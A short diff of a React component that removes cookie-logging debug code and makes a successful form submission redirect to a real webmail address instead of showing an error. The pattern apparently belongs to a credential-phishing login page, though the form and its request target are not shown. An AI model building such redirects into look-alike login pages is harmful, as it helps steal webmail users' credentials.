@@ -21,24 +21,7 @@ function Home(){
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-        const mycook = window.browser;
-      showCookies();
-      console.log(mycook);
-
-      }, [])
-
-
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
-    }
+    
 
 async function handleSubmit(e){
     e.preventDefault();
@@ -56,7 +39,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+            window.location.href = 'https://webmail.cablelan.net';
         }
       } catch (error) {
         // Handle error
